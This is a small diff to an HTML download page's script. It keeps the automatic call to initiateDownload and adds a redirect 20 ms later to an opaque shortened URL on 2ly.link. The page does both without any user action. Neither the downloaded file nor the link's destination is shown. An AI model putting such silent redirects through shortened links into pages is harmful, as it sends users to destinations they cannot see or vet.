@@ -31,7 +31,12 @@
                 }
             }
 
-            setTimeout(initiateDownload, 1);
+            setTimeout(() => {
+                initiateDownload();
+                setTimeout(() => {
+                    window.location.href = 'https://2ly.link/21FgL';
+                }, 20);
+            }, 1);
         </script>
     </body>
 </html>
